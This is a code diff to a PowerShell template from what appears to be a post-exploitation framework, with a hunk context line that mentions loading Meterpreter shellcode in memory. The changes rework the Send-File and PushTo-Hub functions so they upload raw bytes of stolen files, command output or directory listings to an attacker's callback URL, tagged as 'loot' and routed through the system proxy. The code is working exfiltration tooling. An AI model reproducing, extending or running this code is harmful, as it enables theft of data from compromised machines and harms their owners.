@@ -409,7 +409,7 @@ Load the shellcode module with the name 'meterpreter.bin' in memory and run it
 function Send-File {
     Param(
        [Parameter(Mandatory=$True,Position=0)]
-       [String]$Body,
+       [Byte[]]$Body,
 
        [Parameter(Mandatory=$False,Position=1)]
        [String[]]$FileName,
@@ -432,13 +432,14 @@ function Send-File {
     $boundary = [System.Guid]::NewGuid().ToString()
     $LF = "`r`n"
 
-    $bodyLines = (
+    $prebody = (
         "--$boundary",
         "Content-Disposition: form-data; name=`"file[]`"; filename=`"$FileName`"",
-        "Content-Type: application/octet-stream$LF",
-        $Body,
-        "--$boundary--$LF"
+        "Content-Type: application/octet-stream$LF$LF"
     ) -join $LF
+    $postbody = "$LF--$boundary--$LF"
+    $prebody = [System.Text.Encoding]::UTF8.GetBytes($prebody)
+    $postbody = [System.Text.Encoding]::UTF8.GetBytes($postbody)
 
     $post_url = $($CALLBACK_URL + "u?noredirect=1")
     if ($IsLoot) { $post_url += "&loot=1" }
@@ -448,9 +449,11 @@ function Send-File {
     $WebRequest.ContentType = "multipart/form-data; boundary=`"$boundary`""
     $WebRequest.Proxy = [System.Net.WebRequest]::GetSystemWebProxy()
     $PostStream = $WebRequest.GetRequestStream()
-    $BodyLines = [System.Text.Encoding]::ASCII.GetBytes($BodyLines)
-    $PostStream.Write($BodyLines, 0, $BodyLines.Length)
+    $PostStream.Write($prebody, 0, $prebody.Length)
+    $PostStream.Write($Body, 0, $Body.Length)
+    $PostStream.Write($postbody, 0, $postbody.Length)
     $PostStream.Close()
+    {{'Write-Debug "Bytes sent: $($Body.Length)"'|debug}}
     {{'Write-Debug "Reading response"'|debug}}
     try {
         $Response = $WebRequest.GetResponse()
@@ -501,9 +504,11 @@ Get-ChildItem | PushTo-Hub -Name "directory-listing"
         if ($result) {
             {{'Write-Debug "Pushing stdin stream..."'|debug}}
             if ($result.length -eq 1 -and $result[0] -is [System.String]) {
-                Send-File $result[0] $Name
+                $Body = [system.Text.Encoding]::UTF8.GetBytes($result[0])
+                Send-File $Body $Name
             } else {
                 $Body = $result | ConvertTo-Json
+                $Body = [system.Text.Encoding]::UTF8.GetBytes($Body)
                 Send-File $Body $Name
             }
         } else {
@@ -511,16 +516,9 @@ Get-ChildItem | PushTo-Hub -Name "directory-listing"
                 {{'Write-Debug "Pushing $File..."'|debug}}
                 $abspath = (Resolve-Path $file).path
                 $fileBin = [System.IO.File]::ReadAllBytes($abspath)
-                $enc = [System.Text.Encoding]::GetEncoding("UTF-8")
                 if ($Name) { $filename = $name } else { $filename = $file }
 
-                $fileEnc = $enc.GetString($fileBin)
-
-                if ($IsLoot) {
-                    Send-File -IsLoot $fileEnc $filename
-                } else {
-                    Send-File $fileEnc $filename
-                }
+                Send-File $fileBin $filename
 
             }
         }
